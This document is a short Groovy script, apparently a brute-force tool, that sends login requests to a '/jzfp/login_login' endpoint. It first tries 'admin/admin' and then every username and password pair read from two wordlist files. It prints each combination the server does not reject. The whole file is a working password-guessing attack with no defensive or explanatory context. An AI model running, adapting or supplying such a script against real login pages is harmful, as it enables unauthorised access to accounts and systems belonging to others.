import io.vertx.core.MultiMap
import io.vertx.core.Vertx
import io.vertx.ext.web.client.WebClient

def vertx = Vertx.vertx()

def options = [
        keepAlive: true
]
client = WebClient.create(vertx, options)



def loginname = 'admin'
def password = 'admin'


def login(def username, def password) {
    def form = MultiMap.caseInsensitiveMultiMap()
    form.set("KEYDATA", "" + username + ",fh," + password
            + "" + ",fh,undefined")
    form.set("tm", new Date().time.toString())

    client.post(80, "", "/jzfp/login_login")
            .sendForm(form, { ar ->
        if (ar.succeeded()) {
            if (ar.result().body().toString() != '{"result":"usererror"}') {
                println("login success , username is $username, password is $password")
            } else {
//                println("usererror")
            }
        }

    })
}

login(loginname, password)

new File("user").eachLine { user ->
    new File('pw').eachLine { pw ->
        login(user,pw)
    }

}